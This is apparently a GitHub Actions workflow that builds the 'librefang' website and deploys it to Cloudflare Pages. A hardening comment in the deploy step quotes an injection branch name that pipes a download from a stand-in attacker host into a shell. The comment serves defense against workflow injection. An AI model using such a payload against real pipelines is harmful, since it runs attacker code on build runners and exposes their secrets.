name: Deploy Website

on:
  push:
    branches: [main, feat/*, feature/*]
    paths:
      - "web/**"
  pull_request:
    branches: [main]
    paths:
      - "web/**"
  workflow_dispatch:

concurrency:
  group: deploy-web-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read
  deployments: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
      # setup-node's `cache: pnpm` runs `pnpm store path --silent` from the
      # repo root to compute the cache directory. Our `packageManager` field
      # lives in web/package.json, so corepack at the root falls back to the
      # runner image's default pnpm 11 and records `~/.local/share/pnpm/store/v11`.
      # The actual install (`cd web && pnpm install`) then runs pnpm 10.32.1,
      # which writes to `…/store/v10`. Post-job cache save then errors with
      # "Path Validation Error" because the v11 directory was never populated.
      # Pin pnpm explicitly via web/package.json so PATH carries the right
      # version before setup-node's cache pre-step runs.
      - name: Install pnpm (version from web/package.json packageManager)
        uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6
        with:
          package_json_file: web/package.json
          run_install: false

      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6
        with:
          node-version-file: "web/.nvmrc"
          cache: "pnpm"
          cache-dependency-path: web/pnpm-lock.yaml

      - run: cd web && pnpm --version && pnpm install --frozen-lockfile

      - run: cd web && pnpm lint

      - run: cd web && pnpm build

      - name: Deploy to Cloudflare Pages
        # Dependabot PRs come from in-repo `dependabot/...` branches, so
        # they match the same-repo guard below, but they run with the
        # restricted Dependabot token which cannot read Actions secrets.
        # Without the actor check, wrangler errors with "Not logged in"
        # because CLOUDFLARE_API_TOKEN expands to an empty string. The
        # post-merge push to main still triggers a real deploy.
        if: (github.event_name == 'push' || github.event_name == 'workflow_dispatch' || github.event.pull_request.head.repo.full_name == github.repository) && github.actor != 'dependabot[bot]'
        env:
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          # Pass the branch name through an env var so a malicious
          # ref (e.g. evil$(curl attacker.com|sh)) cannot break out of
          # the run-block via shell expansion.  Inline
          # ${{ github.head_ref }} is the canonical GitHub Actions
          # injection vector — #3938 hardened release.yml and
          # discussion-to-issue.yml the same way but missed this site.
          HEAD_REF: ${{ github.head_ref || github.ref_name }}
        run: npx -y wrangler@4 pages deploy web/dist --project-name=librefang --branch="$HEAD_REF"
